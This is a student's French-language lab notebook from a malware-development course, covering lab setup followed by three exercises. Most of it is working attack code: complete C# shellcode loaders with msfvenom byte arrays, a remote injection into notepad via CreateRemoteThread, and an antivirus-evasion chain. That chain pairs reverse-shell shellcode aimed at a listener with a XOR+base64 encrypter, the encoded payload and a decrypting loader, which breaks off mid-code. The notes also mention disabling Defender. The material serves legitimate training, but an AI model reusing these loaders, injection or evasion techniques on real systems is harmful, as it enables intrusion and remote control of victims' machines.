# préparation

## wireguard

- se connecter au vpn du lab `sudo wg-quick up ossecu36`
- vérifier IP et route `sudo wg show`

## préparation du lab

- `ludus range destroy` pour nettoyer le lab et partir sur une base saine.
- créer le fichier de config après avoir récupérer les templates `ludus template list`

- créer le fichier de config `nano ludus-range-config.yml`
  dedans coller la config des vm :

```yaml
# yaml-language-server: $schema=https://docs.ludus.cloud/schemas/range-config.json

ludus:
  - vm_name: "maldev-dev-win10-36"
    hostname: "MALDEV-DEV36"
    template: win10-22h2-x64-enterprise-template
    vlan: 20
    ip_last_octet: 37
    ram_gb: 8
    cpus: 4
    windows:
      visual_studio_version: 2019
    testing:
      snapshot: false
      block_internet: false

  - vm_name: "maldev-target-win10-36"
    hostname: "MALDEV-TGT36"
    template: win10-22h2-x64-enterprise-template
    vlan: 20
    ip_last_octet: 38
    ram_gb: 4
    cpus: 2
    windows: {}
    testing:
      snapshot: false
      block_internet: false

router:
  vm_name: "ossecu36-router-debian11-x64"
  hostname: "ossecu36-router"
  template: debian-11-x64-server-template
  ram_gb: 2
  ram_min_gb: 1
  cpus: 2
```

- set le fichier pour le deployement `ludus range config set -f ludus-range-config.yaml`
- deployer les vm `ludus range deploy`

- suivre les logs du déployement `ludus range logs -f`
- vérifier l'état `ludus range status`

**une fois en success** on peut télécharger les creds rdp et se connecté sur la VM en rdp.

- dl le rdp.zip `ludus range rdp`
- on le dezip (sous linux) `unzip rdp.zip`

## se conneceter à la vm dev

dans le dossier où se trouve le fichier .rdp on fait la commande
`xfreerdp3 /v:10.29.20.37 /u:localuser /p:password /cert:ignore`

## préparation de la vm dev pour les labs

- avant on remet le clavier en azerty `settings>time & language>language`on va dans **preferred** et on clic sur english US et **option** et là on va sur **keyboard** on ajoute son clavier et on supprime l'us et c'est ok.
- on install git sur la vm dev :
  on ouvre **powershell en admin**
  `winget install --id Git.Git -e --source winget`
- il faut cloner le repo ici pour pouvoir facilement modifier les fichiers et appliqué les modifications.
  dans un terminal on on se rend sur desktop par facilité et on clone le repo
  `cd Desktop`
  `git clone https://github.com/ossec25/maldev-for-colinet.git`

## Exercice 1 : créer un pop-up affichant un message

On est bien dans un malware (comportement non désiré exécuté), mais inofensif c'est important de bien faire cette distinction pour rester dans un cadre d'apprentissage et éthique.

pour cet exercice, j'ai choisi le csharp et msfvenom pour générer les bytes du binaires qu'il faudra intégré dans le code.
j'utilise mes habitudes et donc ma vm kali.

- `msfvenom -p windows/x64/messagebox TEXT='Salut la compagnie!' TITLE='Error!' -f csharp`
  on obtiens le payload :

```csharp
byte[] buf = new byte[312] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,
0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,
0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x50,
0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,
0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0xe8,0x14,0x00,0x00,0x00,0x53,0x61,0x6c,
0x75,0x74,0x20,0x6c,0x61,0x20,0x63,0x6f,0x6d,0x70,0x61,0x67,
0x6e,0x69,0x65,0x21,0x00,0x5a,0xe8,0x07,0x00,0x00,0x00,0x45,
0x72,0x72,0x6f,0x72,0x21,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,
0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,
0xf0,0xb5,0xa2,0x56,0xff,0xd5};
```

on va maintenant créer le payload sur base des informations pour le premier exercice avec les appels d'API.
ce qui nous donnera comme fichier entier :

```csharp
using System;
using System.Runtime.InteropServices;

namespace Loader
{
    public class BasicShellcodeLoader
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, Int32 dwMilliseconds);

        public static void Main()
        {
            byte[] sc = new byte[312] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,
            0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,
            0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
            0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
            0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
            0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
            0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
            0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x50,
            0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
            0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
            0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,
            0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
            0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
            0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0xe8,0x14,0x00,0x00,0x00,0x53,0x61,0x6c,
            0x75,0x74,0x20,0x6c,0x61,0x20,0x63,0x6f,0x6d,0x70,0x61,0x67,
            0x6e,0x69,0x65,0x21,0x00,0x5a,0xe8,0x07,0x00,0x00,0x00,0x45,
            0x72,0x72,0x6f,0x72,0x21,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,
            0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,
            0xf0,0xb5,0xa2,0x56,0xff,0xd5};

            int scSize = sc.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, scSize, COMMIT_RESERVE, EXECUTEREADWRITE);

            Marshal.Copy(sc, 0, payAddr, scSize);

            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);

            uint waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}
```

- ensuite une fois le malware créé on va le **compiler en .exe** sinon il sert à rien.
  dans vs studio on passe en **release** (au lieu de debuug près du play et any cpu) et on fait on passe en x64 (manage new x64 copie depuis cpu) on fait **F6** (ou build>build solution)

- on récupère le exe (clic droit sur le projet et open folder in file explorer) on va dans obj/release et on trouve le fichier application.
  nous voilà avec le premier malware.

## créer un dossier de partage (smb)

- sur la vm dev dans c:/ on créer un dossier **share** et on fait un clic droit dessus
  `properties>sharing>advanced sharing et cocher share this folder`

### Observation

Il a été nécessaire d'intégrer le byte[] dans un loader C# utilisant P/Invoke (VirtualAlloc → copie mémoire → CreateThread → WaitForSingleObject) pour une exécution dans le processus courant.
Un premier échec venait d’une compilation “Any CPU” ; correction en ciblant explicitement x64 (cohérent avec le payload x64).
Après recompilation, le binaire s’exécute correctement sur la VM de dev puis sur la VM cible et affiche la boîte de dialogue attendue.
Aucune réaction de windows defender avant ou après l'execution du malware qui n'est pourtant pas obfusqué.

## exercice 2 : injection du code dans un processus distant (explorer.exe)

- on va partir sur une base comme pour l'exo 1 avec quelques modifications dans la génération du payload avec msfvenom et en adaptant un peu le code.
  il faut vérifier ici qu'on à bien un accès à l'exécution du proccessus voulu en activant sedebugprivilege.

on génére le payload avec msfvenom pour lancer la calculatrice par exemple.
`msfvenom windows/x64/exec CMD="calc.exe" -f csharp`
on récupère le payload pour l'insérrer dans notre payload :
**payload**

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace malware_for_dummies
{
    class Program
    {
        [Flags] public enum ProcessAccessFlags : uint { All = 0x001F0FFF }
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(ProcessAccessFlags access, bool inherit, int pid);
        [Flags] public enum AllocType { Commit = 0x1000, Reserve = 0x2000 }
        [Flags] public enum MemProtect { ExecuteReadWrite = 0x40 }
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, AllocType type, MemProtect protect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern UInt32 WaitForSingleObject(IntPtr handle, Int32 ms);

        public static void Main()
        {
            byte[] sc = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
            int len = sc.Length;

            string target = "notepad";
            Process[] procs = Process.GetProcessesByName(target);
            if (procs.Length == 0) { Console.WriteLine("No explorer.exe"); return; }
            int pid = procs[0].Id;  // Premier PID explorer
            Console.WriteLine($"Inject in {target} PID {pid}");

            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pid);
            if (hProc == IntPtr.Zero) { Console.WriteLine($"OpenProcess fail: {Marshal.GetLastWin32Error()}"); return; }

            IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)len, AllocType.Commit | AllocType.Reserve, MemProtect.ExecuteReadWrite);
            if (mem == IntPtr.Zero) { Console.WriteLine($"AllocEx fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            IntPtr written;
            if (!WriteProcessMemory(hProc, mem, sc, len, out written)) { Console.WriteLine($"Write fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }
            Console.WriteLine($"Wrote {written} bytes");

            IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread == IntPtr.Zero) { Console.WriteLine($"RemoteThread fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            WaitForSingleObject(thread, -1);
            CloseHandle(hProc); CloseHandle(thread);
            Console.WriteLine("Injection done. Calc opened?");
            Console.ReadLine();
        }

    }
}
```

on build comme pour l'exo 1 et on le run.

### Observation

Pour utiliser un processus avec un privilège admin ou autre que l'utilisateur courant, il faut une escalation de privilège et ici le payload ne le permet pas. Pour le faire fonctionné j'ai donc utilisé notepad (fonctionne sans droits nécessaire par défaut) et aussi désactiver defender car directement il détectait et supprimait le malware.
Aussi pour cet exercice, vu que l'objectif est de ciblé un processus en cours pour injecté le shellcode et donc exécuté un autre process comme la calculatrice que j'ai choisi dans mon payload, il est utile d'avoir le premier processus en cours.
j'ai donc du ouvrir notepad puis executé le malware et la calculatrice est apparue.

## Exercice 3 : evasion antivirus

Pour cet exercice je vais essayer d'obtenir un reverse shell sur la machine victime avec un payload staged (en 2 étapes).
Le principe sera d'envoyer un premier fichier sur la target pour obtenir une clé encrypté en l'executant et avec cette clé créé un payload qui utilisera cette clé pour être décrypté et être exécuté sur la machine cible.

### création d'un encodeur personnalisé (XOR + base64)

- on génère le payload avec msfvenom
  `msfvenom LHOST=10.29.20.37 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp`

```csharp
byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
0x0a,0x1d,0x14,0x25,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
```

on récupère la génération ci-dessus pour la coller dans le code suivant :

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "H4cK3urP45510N";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
            0x0a,0x1d,0x14,0x25,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
            0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
            0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
            0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
            0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
            0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
            0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
            0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
            0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
            0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
            0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));
        }
    }
}
```

On à maintenant la première partie, celle qui va nous permettre de générer la clé base64+xor

on va sur la target machine, on lance PS et cette commande :
`& "\\10.29.20.37\share\AV_evasion.exe"` pour éxécuter le script et récupérer la clé xor+base64

```base64
tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8ZikJGA299ejRjCmU8+7Z8tNmRMU5IfequeslwUDWOPywkawlgKsLXOfuhdY95RhZJt+Evwtkdc1E0NWxwimfIX2O05iUiHQX8eADwBrf0K8LxPY2QfLz0cIqkR+uDtOY9+5deJXRpfMeqfOqycs/r9UBUyuR4z4x0YUszPMozWVE1MTBOSHUzCmM9+7JjYmJ8AY4iOToKY5eONvNxEWUxTwC5J28rs3I4fLzTZ2APGHUzCmM8jZB1ZXzO+APB9S/C8jTIKfgKs87lBnnmK7T5/nwRjj2yLFCxnY+T/pEjM+qSoIisz5sAt6djD3MOWrTO1UQ19Q8nESRZdSsRve/K5A==
```

maintenant on va utiliser un nouveau fichier avec la clé intégré et c'est ce fichier qui va nous donné accès à la machine cible.

## modification du payload sur base de la clé obtenue avec le précédent payload.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint prot);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr handle, uint ms);
    const uint MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40;
    static byte[] Xor(byte[] shell, byte[] key) { for (int i = 0; i < shell.Length; i++) shell[i] ^= key[i % key.Length]; return shell; }
    static void Main()
    {
        string dataBS64 = "tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8ZikJGA299ejRjCmU8+7Z8tNmRMU5IfequeslwUDWOPywkawlgKsLXOfuhdY95RhZJt+Evwtkdc1E0NWxwimfIX2O05iUiHQX8eADwBrf0K8LxPY2QfLz0cIqkR+uDtOY9+5deJXRpfMeqfOqycs/r9UBUyuR4z4x0YUszPMozWVE1MTBOSHUzCmM9+7JjYmJ8AY4iOToKY5eONvNxEWUxTwC5J28rs3I4fLzTZ2APGHUzCmM8jZB1ZXzO+APB9S/C8jTIKfgKs87lBnnmK7T5/nwRjj2yLFCxnY+T/pEjM+qSoIisz5sAt6djD3MOWrTO1UQ19Q8nESRZdSsRve/K5A==";
        byte[] data = Convert.FromBase64String(dataBS64);
        string key = "H4cK3urP45510N"; byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        byte[] shellcode = Xor(data, keyBytes);  // decrypt
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero) return;  // Fail safe
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
